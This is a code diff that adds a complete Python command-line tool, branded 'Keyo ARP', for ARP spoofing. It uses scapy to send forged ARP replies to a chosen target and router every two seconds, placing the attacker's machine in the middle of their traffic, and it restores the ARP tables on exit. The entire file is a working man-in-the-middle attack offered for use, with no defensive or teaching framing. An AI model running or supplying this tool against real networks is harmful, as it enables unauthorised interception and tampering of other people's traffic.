@@ -1,0 +1,97 @@
+import argparse
+import scapy.all as scapy
+import time
+from colorama import Fore, Style, init
+import pyfiglet
+
+# Initialize Colorama
+init()
+
+
+def banner():
+    """Display the program banner."""
+    ascii_banner = pyfiglet.figlet_format("Keyo ARP")
+    print(Fore.RED + ascii_banner + Style.RESET_ALL)
+
+
+def get_arguments():
+    """Parse command line arguments."""
+    parser = argparse.ArgumentParser(description="ARP Spoofing Tool by Keyo")
+    parser.add_argument("-t", "--target", dest="target_ip", help="Enter Device IP Target", required=True)
+    parser.add_argument("-r", "--router", dest="router_ip", help="Enter IP Network", required=True)
+    args = parser.parse_args()
+    return args
+
+
+def get_mac(ip):
+    """Retrieve the MAC address of a device based on its IP address."""
+    try:
+        arp_request = scapy.ARP(pdst=ip)
+        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = arp_broadcast / arp_request
+        answered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
+
+        if answered:
+            return answered[0][1].hwsrc
+        else:
+            return None
+    except Exception as error:
+        print(Fore.RED + f"☠️ [-_-] Error retrieving MAC address for {ip}: {error}" + Style.RESET_ALL)
+        exit()
+
+
+def spoof(target_ip, spoof_ip):
+    """Perform ARP spoofing on the target with the spoofing IP."""
+    try:
+        target_mac = get_mac(target_ip)
+        if target_mac is None:
+            print(
+                Fore.RED + f"☠️ [-_-] Target MAC address could not be retrieved for {target_ip}. Exiting." + Style.RESET_ALL)
+            return
+
+        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(arp_response, verbose=False)
+    except Exception as error:
+        print(Fore.RED + f"☠️ [-_-] Error in spoofing {target_ip} with {spoof_ip}: {error}" + Style.RESET_ALL)
+
+
+def restore(target_ip, source_ip):
+    """Restore the ARP table for the target device."""
+    try:
+        target_mac = get_mac(target_ip)
+        source_mac = get_mac(source_ip)
+
+        if target_mac is None or source_mac is None:
+            print(Fore.RED + f"☠️ [-_-] Could not retrieve MAC addresses for restoration. Exiting." + Style.RESET_ALL)
+            return
+
+        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(arp_response, count=4, verbose=False)
+    except Exception as error:
+        print(Fore.RED + f"☠️ [-_-] Error restoring ARP table for {target_ip}: {error}" + Style.RESET_ALL)
+
+
+# Main part of the program
+if __name__ == "__main__":
+    args = get_arguments()
+    target_ip = args.target_ip
+    spoof_ip = args.router_ip
+
+    try:
+        banner()
+        print(Fore.CYAN + " 👺[*_*] Starting ARP spoofing attack..." + Style.RESET_ALL)
+        while True:
+            spoof(target_ip, spoof_ip)
+            spoof(spoof_ip, target_ip)
+            print(Fore.YELLOW + "👺[*_*] 2 Packets sent..." + Style.RESET_ALL)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print(Fore.RED + "\n[>_<] Exiting... Restoring network settings..." + Style.RESET_ALL)
+        restore(target_ip, spoof_ip)
+        restore(spoof_ip, target_ip)
+        print(Fore.GREEN + "[*_*] Network restored successfully. Goodbye!" + Style.RESET_ALL)
+    except Exception as error:
+        print(Fore.RED + f"\n[>_<] Unexpected error occurred: {error}" + Style.RESET_ALL)
+        restore(target_ip, spoof_ip)
+        restore(spoof_ip, target_ip)
+        print(Fore.GREEN + "[*_*] Network restored successfully after error. Goodbye!" + Style.RESET_ALL)
